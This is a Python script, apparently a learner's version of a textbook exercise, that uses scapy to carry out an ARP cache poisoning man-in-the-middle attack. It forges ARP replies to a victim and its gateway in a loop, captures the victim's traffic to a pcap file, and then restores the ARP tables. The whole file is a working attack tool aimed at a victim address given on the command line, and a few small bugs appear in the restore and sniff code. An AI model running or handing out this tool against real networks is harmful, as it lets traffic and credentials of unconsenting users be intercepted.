from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import logging    # Added to suppress Warnings.
import os
import sys
import time

# Although it works, I had to come up with a way to suppress scapy runtime warning as it messed up the terminal.
# The warning: "WARNING: You should be providing the Ethernet destination MAC address when sending an is-at ARP."
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Helper function to get MAC address for any given machine.
def get_mac(targetip, iface):
    # Ether function broadcasts the packet and the ARP function specifies the request for MAC address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    # Then pass the packet to Scapy's function 'srp' which is responsible for sending and receiving packets on layer 2.
    # Without specifying the 'iface', the first request showed no mac addresses for the target machine.
    resp, _ = srp(packet, timeout=2, retry=10, iface=iface, verbose=False)
    # Loop through responses and print the expected MAC address of targeted IP.
    for _, r in resp:
        return r[Ether].src
    return None

# A class that will poison, sniff, and restore network settings.
class Arper:
    def __init__(self, victim, gateway, interface='eth1'):
        self.victim = victim
        self.victimmac = get_mac(victim, interface)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway, interface)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)

    # This function performs the main work of the Arper object.
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # Create ARP poisoning packet intended for the victim.
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        # Then create the second ARP poisoning packet for the Gateway.
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL+C tp stop]')
        # Start sending poisoning packets to their respective destinations.
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    # This method is used to monitor and record the attack as it happens through sniffing all traffic.
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        BPF_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=BPF_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished!')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff:'),
            count=5)

if __name__ == '__main__':
    # Just to ensure the arguments are provided.
    if len(sys.argv) != 4:
        print(f"Usage: sudo {sys.argv[0]} <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run ()
